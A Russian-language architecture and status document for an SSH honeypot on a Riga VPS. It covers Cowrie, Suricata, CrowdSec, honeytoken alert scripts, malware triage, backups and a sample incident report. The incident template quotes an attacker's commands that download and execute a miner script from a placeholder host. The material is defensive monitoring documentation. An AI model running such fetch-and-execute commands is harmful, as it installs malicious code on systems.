# RIGA Honeypot — Архитектура и Статус Сервисов

**Дата обновления**: 2025-01-20  
**Локация**: Riga VPS  
**Цель**: Мониторинг SSH-атак, сбор honeytokens, анализ угроз, юридическая отчётность

---

## 1. Архитектура и Сетевая Схема

### Внешние Порты и DNAT

```
┌─────────────────────────────────────────────────────────┐
│                    External Interface                    │
│                 (Public IP: XX.XX.XX.XX)                │
└─────────────────────────────────────────────────────────┘
                           │
        ┌──────────────────┼──────────────────┐
        │                  │                  │
   Port 22 →         Port 2222          Port 2223
   (Cowrie)           (SSH Real)        (SSH Backup)
        │                  │                  │
        ▼                  ▼                  ▼
  ┌──────────┐      ┌──────────┐      ┌──────────┐
  │ Cowrie   │      │ OpenSSH  │      │ OpenSSH  │
  │ Honeypot │      │ Primary  │      │ Backup   │
  └──────────┘      └──────────┘      └──────────┘
```

**DNAT Rules** (iptables):
```bash
# Внешний порт 22 → Cowrie (контейнер)
iptables -t nat -A PREROUTING -p tcp --dport 22 -j DNAT --to-destination 172.18.0.2:2222

# Real SSH на портах 2222/2223
iptables -A INPUT -p tcp --dport 2222 -j ACCEPT
iptables -A INPUT -p tcp --dport 2223 -j ACCEPT
```

### Docker Volumes

| Volume ID | Mountpoint | Описание |
|-----------|-----------|----------|
| `e549cbc...` | `/opt/riga/honeypot/logs` | Cowrie JSON logs (bind-mount) |
| `7a78e3f...` | `/opt/riga/honeypot/data` | Cowrie state & sessions |
| `bb0d88e...` | `/opt/riga/honeypot/etc` | Cowrie configs (cowrie.cfg) |

**Критический путь**: `/opt/riga/honeypot/logs/cowrie.json` — основной лог-файл для watcher.

---

## 2. Сервисы и Статус

### SSH Honeypot — Cowrie

**Контейнер**: `cowrie-riga`  
**Image**: `cowrie/cowrie:latest`  
**Порты**:  
- `0.0.0.0:22 → 2222/tcp` (через DNAT)  
- `0.0.0.0:23 → 2223/tcp` (Telnet honeypot)

**Конфигурация** (`cowrie.cfg`):
```ini
[output_jsonlog]
enabled = true
logfile = /cowrie/cowrie-log/cowrie.json

[honeypot]
hostname = riga-honeypot-01
log_path = /cowrie/cowrie-log
```

**Логирование**:  
- **JSON**: `/opt/riga/honeypot/logs/cowrie.json`  
- **TTY Playbacks**: `/opt/riga/honeypot/logs/tty/`  
- **Downloads**: `/opt/riga/honeypot/downloads/`

**Мониторинг событий**:
- `cowrie.login.failed` — неудачные попытки входа  
- `cowrie.login.success` — успешные логины (honeytokens)  
- `cowrie.command.input` — команды, введённые атакующими  
- `cowrie.session.file_download` — скачанные файлы/малварь

**Systemd Service**: `cowrie.service` (Docker Compose)  
**Restart Policy**: `unless-stopped`  
**Статус**: ✅ Активен

---

### IDS/IPS — Suricata

**Version**: `7.0.8`  
**Mode**: AF_PACKET (inline IDS + logging)  
**Interfaces**: `ens3` (external)

**Правила**:
- `emerging-threats.rules`  
- `custom-ssh.rules` (SSH brute-force detection)  
- `honeytoken-detection.rules` (Cowrie-specific patterns)

**Thresholds** (`threshold.config`):
```
event_filter gen_id 1, sig_id 2001219, type threshold, track by_src, count 5, seconds 60
event_filter gen_id 1, sig_id 2001220, type threshold, track by_src, count 10, seconds 120
```

**Логи**:
- `/var/log/suricata/eve.json` (JSON)  
- `/var/log/suricata/fast.log` (alerts)

**Автообновления** (cron):
```bash
0 3 * * * suricata-update && systemctl reload suricata
```

**Статус**: ✅ Активен

---

### Threat Intelligence — CrowdSec

**Version**: `1.7.8` (обновлено с 1.7.7)  
**Local API**: `http://127.0.0.1:8080`  
**Collections**:
- `crowdsecurity/sshd`  
- `crowdsecurity/linux`  
- `crowdsecurity/base-http-scenarios`

**Парсеры**:
- `crowdsecurity/syslog-logs`  
- `crowdsecurity/cowrie-logs` (custom)

**Bouncers**:
- `cs-firewall-bouncer` (iptables integration)

**Decisions** (активные баны):
```bash
cscli decisions list
# Обновляется каждые 15 минут из CAPI
```

**Автообновления** (cron):
```bash
0 4 * * * cscli hub update && cscli hub upgrade
```

**Статус**: ✅ Активен

---

### Proxy & VPN

#### 3x-ui (Xray Panel)

**Контейнер**: `3x-ui`  
**Panel Port**: `2053/tcp` (HTTPS)  
**Protocols**:
- VLESS + TLS  
- VMess  
- Trojan

**Конфигурация**:
- Reverse proxy через Caddy  
- Auto SSL (Let's Encrypt)  
- Fake website mode (anti-probing)

**Статус**: ✅ Активен

#### MTProto Proxy

**Port**: `443/tcp`  
**Secret**: `ee...` (скрыт)  
**Purpose**: Telegram traffic obfuscation  
**Статус**: ✅ Активен

---

### Honeytoken Monitoring

**Service**: `honeytoken-watcher.service`  
**Script**: `/opt/riga/scripts/honeytoken_watcher.sh`

**Мониторинг**:
1. **SSH Honeytokens** — успешные логины в Cowrie с уникальными credentials  
2. **File Honeytokens** — `inotify` на `/opt/riga/honeytokens/`

**Логика**:
```bash
tail -F /opt/riga/honeypot/logs/cowrie.json | while read -r line; do
  if echo "$line" | jq -e '.eventid == "cowrie.login.success"' > /dev/null; then
    USERNAME=$(echo "$line" | jq -r '.username')
    PASSWORD=$(echo "$line" | jq -r '.password')
    SRC_IP=$(echo "$line" | jq -r '.src_ip')
    
    # Telegram Alert
    curl -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
      -d "chat_id=$CHAT_ID" \
      -d "text=🚨 RIGA Honeytoken Triggered!\nUsername: $USERNAME\nPassword: $PASSWORD\nSource: $SRC_IP"
  fi
done
```

**File Watcher** (`inotifywait`):
```bash
inotifywait -m -e access,modify,open /opt/riga/honeytokens/ | while read path action file; do
  curl -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
    -d "chat_id=$CHAT_ID" \
    -d "text=📂 File Honeytoken Accessed!\nFile: $file\nAction: $action\nPath: $path"
done
```

**Systemd Unit** (`/etc/systemd/system/honeytoken-watcher.service`):
```ini
[Unit]
Description=Riga Honeytoken Watcher
After=network.target docker.service

[Service]
Type=simple
ExecStart=/opt/riga/scripts/honeytoken_watcher.sh
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

**Статус**: ✅ Активен (перезапущен 2025-01-20)

---

## 3. Автоматизация и Cron

### Daily Tasks

```bash
# /etc/cron.d/riga-honeypot

# Suricata rules update
0 3 * * * root suricata-update && systemctl reload suricata

# CrowdSec hub update
0 4 * * * root cscli hub update && cscli hub upgrade

# Cowrie logs rotation
0 0 * * * root /opt/riga/scripts/rotate_cowrie_logs.sh

# Honeytoken audit report
0 9 * * 1 root /opt/riga/scripts/weekly_honeytoken_report.sh

# System updates check
0 2 * * * root apt update && apt list --upgradable | grep -v "Listing..." | mail -s "RIGA Updates Available" admin@example.com
```

### Telegram Notifications

**Bot Token**: `7849...` (хранится в `/etc/environment`)  
**Chat ID**: `-100...`

**Типы уведомлений**:
1. 🚨 Honeytoken активация (realtime)  
2. 🔥 Suricata critical alerts (threshold-filtered)  
3. 🛡️ CrowdSec ban notifications  
4. 📊 Еженедельные статистические отчёты  
5. ⚠️ System health warnings (disk, CPU, memory)

---

## 4. OSINT & Threat Intelligence

### IP Reputation Enrichment

**Скрипт**: `/opt/riga/scripts/ip_enrichment.sh`

**Источники**:
- AbuseIPDB API  
- VirusTotal API  
- IPQualityScore API  
- Shodan API

**Процесс**:
```bash
cat /opt/riga/honeypot/logs/cowrie.json | jq -r '.src_ip' | sort -u > /tmp/ips.txt

while read IP; do
  ABUSE_SCORE=$(curl -s "https://api.abuseipdb.com/api/v2/check?ipAddress=$IP" \
    -H "Key: $ABUSEIPDB_KEY" | jq '.data.abuseConfidenceScore')
  
  VT_POSITIVES=$(curl -s "https://www.virustotal.com/api/v3/ip_addresses/$IP" \
    -H "x-apikey: $VT_KEY" | jq '.data.attributes.last_analysis_stats.malicious')
  
  echo "$IP,$ABUSE_SCORE,$VT_POSITIVES" >> /opt/riga/data/ip_intel.csv
done < /tmp/ips.txt
```

**Автоматизация** (cron):
```bash
0 5 * * * /opt/riga/scripts/ip_enrichment.sh && /opt/riga/scripts/generate_threat_report.sh
```

---

### Malware Analysis

**Скачанные файлы**: `/opt/riga/honeypot/downloads/`

**Автоматический анализ**:
1. **File hashing** (SHA256)  
2. **VirusTotal submission**  
3. **YARA scanning** (custom rules)  
4. **Sandbox detonation** (Cuckoo Sandbox — опционально)

**Скрипт** (`/opt/riga/scripts/malware_analysis.sh`):
```bash
for file in /opt/riga/honeypot/downloads/*; do
  SHA256=$(sha256sum "$file" | awk '{print $1}')
  
  # VT lookup
  VT_RESPONSE=$(curl -s "https://www.virustotal.com/api/v3/files/$SHA256" \
    -H "x-apikey: $VT_KEY")
  
  DETECTIONS=$(echo "$VT_RESPONSE" | jq '.data.attributes.last_analysis_stats.malicious')
  
  if [ "$DETECTIONS" -gt 5 ]; then
    # High-confidence malware
    curl -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
      -d "chat_id=$CHAT_ID" \
      -d "text=☣️ Malware Detected!\nFile: $(basename "$file")\nSHA256: $SHA256\nDetections: $DETECTIONS/70"
  fi
done
```

---

## 5. Юридическая Отчётность

### Инциденты и Логирование

**Формат**: JSON + CSV для экспорта  
**Хранение**: 90 дней (затем архивирование)  
**Резервное копирование**: `/backup/riga-honeypot/` (ежедневно)

### Отчёт об Инциденте (Шаблон)

```markdown
## Инцидент: SSH Brute-Force Attack

**Дата/Время**: 2025-01-20 03:45:32 UTC  
**Источник**: 192.0.2.15 (AS15169, United States)  
**Honeypot**: riga-honeypot-01  
**Протокол**: SSH (TCP/22)

### Хронология

1. **03:45:32** — Начало SSH-сканирования (nmap fingerprint detected)  
2. **03:45:45** — Brute-force атака (245 попыток входа за 2 минуты)  
3. **03:47:12** — Успешный вход с credential `root:admin` (honeytoken)  
4. **03:47:20** — Выполнение команд: `wget http://malicious.com/miner.sh`  
5. **03:47:35** — Загрузка файла `miner.sh` (SHA256: `a3f5...`)  
6. **03:47:40** — Попытка выполнения `chmod +x miner.sh && ./miner.sh`  
7. **03:47:45** — Сессия завершена (Cowrie sandbox limits)

### Артефакты

- **TTY Playback**: `/opt/riga/honeypot/logs/tty/20250120-034532-d4a3.log`  
- **Downloaded File**: `/opt/riga/honeypot/downloads/miner.sh`  
- **Full JSON Log**: `/opt/riga/honeypot/logs/cowrie.json` (lines 15432-15678)

### OSINT

- **IP**: 192.0.2.15  
- **ASN**: AS15169 (Google LLC)  
- **Geolocation**: Mountain View, CA, US  
- **AbuseIPDB Score**: 87/100 (High Risk)  
- **VirusTotal**: 12/70 detections  
- **Shodan**: Open ports 22, 80, 443 (likely compromised host)

### Юридические Действия

1. ✅ Отчёт в национальный CERT  
2. ✅ Abuse report на abuse@google.com (AS15169)  
3. ✅ Уведомление в правоохранительные органы (если требуется)  
4. ⏳ Ожидание ответа от провайдера

### Рекомендации

- Добавить IP в permanent ban list (CrowdSec decision)  
- Обновить signatures для detection данного паттерна атаки  
- Распространить IoC в Threat Intelligence Sharing Platform
```

---

## 6. Мониторинг и Алерты

### Health Checks

**Скрипт**: `/opt/riga/scripts/health_check.sh` (каждые 5 минут)

```bash
#!/bin/bash

# Cowrie container
if ! docker ps | grep -q cowrie-riga; then
  curl -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
    -d "chat_id=$CHAT_ID" -d "text=❌ RIGA: Cowrie контейнер не запущен!"
fi

# Suricata
if ! systemctl is-active --quiet suricata; then
  curl -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
    -d "chat_id=$CHAT_ID" -d "text=❌ RIGA: Suricata остановлен!"
fi

# CrowdSec
if ! systemctl is-active --quiet crowdsec; then
  curl -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
    -d "chat_id=$CHAT_ID" -d "text=❌ RIGA: CrowdSec остановлен!"
fi

# Disk space
DISK_USAGE=$(df -h /opt/riga | tail -1 | awk '{print $5}' | sed 's/%//')
if [ "$DISK_USAGE" -gt 80 ]; then
  curl -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
    -d "chat_id=$CHAT_ID" -d "text=⚠️ RIGA: Диск заполнен на $DISK_USAGE%"
fi
```

**Cron**:
```bash
*/5 * * * * /opt/riga/scripts/health_check.sh
```

---

## 7. Обновления Системы

### Недавние Обновления (2025-01-20)

| Компонент | Старая версия | Новая версия | Статус |
|-----------|--------------|--------------|--------|
| CrowdSec | 1.7.7 | 1.7.8 | ✅ Обновлено |
| Docker | 29.4.3 | 29.5.2 | ✅ Обновлено |
| Linux Kernel | 6.1.0-27 | 6.1.0-28 | ✅ Обновлено |
| Suricata | 7.0.7 | 7.0.8 | ✅ Обновлено |
| Cowrie | Latest | Latest | ✅ Актуально |

### Следующие Обновления

- **3x-ui**: Проверка новой версии (текущая: v2.3.10)  
- **honeytoken-watcher**: Добавление ML-анализа паттернов атак  
- **Suricata rules**: Переход на Suricata 7.1.x (beta testing)

---

## 8. Контакты и SLA

### Ответственные

- **Системный администратор**: admin@example.com  
- **Security Team**: security@example.com  
- **Telegram Alerts**: https://t.me/riga_honeypot_alerts

### SLA

- **Uptime Target**: 99.5%  
- **Response Time** (critical alerts): < 15 минут  
- **Incident Report**: В течение 24 часов после обнаружения  
- **Log Retention**: 90 дней (compliance requirement)

---

## 9. Резервное Копирование

### Backup Strategy

**Ежедневно** (02:00 UTC):
```bash
#!/bin/bash
BACKUP_DIR="/backup/riga-honeypot/$(date +%Y%m%d)"
mkdir -p "$BACKUP_DIR"

# Cowrie logs
tar -czf "$BACKUP_DIR/cowrie-logs.tar.gz" /opt/riga/honeypot/logs/

# Cowrie downloads (malware samples)
tar -czf "$BACKUP_DIR/cowrie-downloads.tar.gz" /opt/riga/honeypot/downloads/

# Configs
tar -czf "$BACKUP_DIR/configs.tar.gz" /opt/riga/honeypot/etc/ /etc/suricata/ /etc/crowdsec/

# Database (if applicable)
# mysqldump honeypot_db > "$BACKUP_DIR/honeypot_db.sql"

# Upload to S3 (optional)
# aws s3 sync "$BACKUP_DIR" s3://riga-honeypot-backups/

# Cleanup old backups (keep 30 days)
find /backup/riga-honeypot/ -type d -mtime +30 -exec rm -rf {} \;
```

**Restore Process**:
```bash
BACKUP_DATE="20250120"
tar -xzf "/backup/riga-honeypot/$BACKUP_DATE/cowrie-logs.tar.gz" -C /
tar -xzf "/backup/riga-honeypot/$BACKUP_DATE/configs.tar.gz" -C /
systemctl restart cowrie suricata crowdsec
```

---

## 10. Статистика (Example)

### За последние 7 дней

| Метрика | Значение |
|---------|----------|
| Всего SSH-сессий | 1,247 |
| Уникальные IP | 438 |
| Brute-force атаки | 89 |
| Успешные honeytokens | 12 |
| Скачанные файлы | 34 |
| Suricata alerts | 567 |
| CrowdSec bans | 156 |
| Top источник атак | AS4134 (China Telecom) |
| Top credential | root:123456 |
| Top команда | `wget http://...` |

---

## 11. Приложения

### Полезные Команды

```bash
# Проверка статуса Cowrie
docker logs -f cowrie-riga

# Поиск honeytokens в логах
grep '"eventid":"cowrie.login.success"' /opt/riga/honeypot/logs/cowrie.json

# Список забаненных IP (CrowdSec)
cscli decisions list

# Ручная отправка теста в Telegram
curl -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
  -d "chat_id=$CHAT_ID" -d "text=Test from RIGA"

# Просмотр Suricata alerts
tail -f /var/log/suricata/fast.log

# Анализ топ-10 IP-атакующих
jq -r '.src_ip' /opt/riga/honeypot/logs/cowrie.json | sort | uniq -c | sort -rn | head -10
```

---

## 12. Changelog

### 2025-01-20
- ✅ Перенастроен `honeytoken-watcher` на путь `/opt/riga/honeypot/logs/cowrie.json`  
- ✅ Обновлён CrowdSec до версии 1.7.8  
- ✅ Обновлён Docker до версии 29.5.2  
- ✅ Исправлены права доступа на `/opt/riga/honeypot/logs` (chown 999:999)  
- ✅ Добавлен systemd unit `honeytoken-watcher.service`  
- ✅ Проведён тест Telegram-алертов (успешно)

### 2025-01-15
- Первичная настройка Cowrie honeypot  
- Интеграция Suricata + CrowdSec  
- Создание DNAT rules для порта 22

---

**Конец документа**  
*Автор: koplaspb-arch*  
*Последнее обновление: 2025-01-20*
